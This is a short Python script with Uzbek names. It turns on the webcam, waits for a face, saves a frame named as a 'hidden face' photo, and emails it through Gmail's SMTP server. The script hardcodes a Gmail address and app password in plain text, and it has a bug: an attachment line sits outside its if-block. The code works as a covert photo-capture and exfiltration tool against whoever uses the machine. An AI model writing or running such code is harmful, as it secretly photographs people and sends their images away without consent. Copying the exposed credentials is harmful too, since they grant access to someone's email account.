import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def yuborish(email, qabulemail, sarlavha, matn, file, parol):
    
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = qabulemail
    msg['Subject'] = sarlavha

    msg.attach(MIMEText(matn, 'plain'))

    if file:
        with open(file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={file}',
            )
    msg.attach(part)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, parol)
    server.sendmail(
        email,
        qabulemail,
        msg.as_string()
    )
    server.quit()
def rasmga_ol():
    cap = cv2.VideoCapture(0)
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")

    captured = False
    file_name = "yashirin_yuz.jpg"

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, 1.3, 5)

        for (x, y, w, h) in faces:
            if not captured:
                cv2.imwrite(file_name, frame)
                print("Surat olindi:", file_name)
                captured = True
                break

        if captured:
            break

    cap.release()
    return file_name

if __name__ == "__main__":
    file_name = rasmga_ol()
    yuborish("fayzinisonazirjonova39@gmail.com", "fayzinisonazirjonova39@gmail.com","Rasm keldi", "Kerakli rasm", file_name, "kgjq qddc nyfn gxlj")